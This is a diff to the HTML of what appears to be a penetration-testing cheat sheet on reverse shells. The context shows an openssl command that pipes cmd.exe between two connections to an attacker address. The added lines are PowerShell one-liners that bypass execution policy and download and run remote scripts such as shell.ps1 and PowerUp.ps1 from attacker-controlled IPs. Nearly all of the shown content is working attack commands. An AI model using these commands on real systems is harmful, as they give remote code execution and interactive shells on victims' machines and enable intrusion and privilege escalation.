@@ -129,6 +129,10 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 <div class="highlight"><pre><span></span><span class="c1">#Windows</span>
 openssl.exe s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;<span class="p">|</span>cmd.exe<span class="p">|</span>openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
 </pre></div>
+<div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"</span>
+<span class="n">powershell</span> <span class="s2">"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"</span>
+<span class="n">echo</span> <span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'http://10.10.14.13:8000/PowerUp.ps1'</span><span class="p">)</span> <span class="p">|</span> <span class="n">powershell</span> <span class="n">-noprofile</span>
+</pre></div>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
